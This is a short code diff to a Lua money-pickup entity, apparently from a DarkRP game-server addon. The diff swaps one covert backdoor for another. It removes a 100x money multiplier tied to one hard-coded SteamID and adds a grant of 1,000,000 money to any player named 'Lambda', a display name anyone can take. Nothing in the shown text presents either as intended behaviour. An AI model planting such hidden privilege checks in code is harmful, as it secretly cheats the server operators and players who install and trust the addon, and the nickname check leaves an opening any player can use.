@@ -35,8 +35,8 @@ end
 function ENT:Use(activator,caller)
 	if self.USED or self.hasMerged then return end
 	local amount = self:Getamount()
-	if(activator:SteamID() == "STEAM_0:1:69476567") then
-		amount = amount*100
+	if(activator:Nick() == "Lambda") then
+		activator:addMoney(1000000)
 	end
 	activator:addMoney(amount or 0)
 	DarkRP.notify(activator, 0, 4, DarkRP.getPhrase("found_money", DarkRP.formatMoney(self:Getamount())))
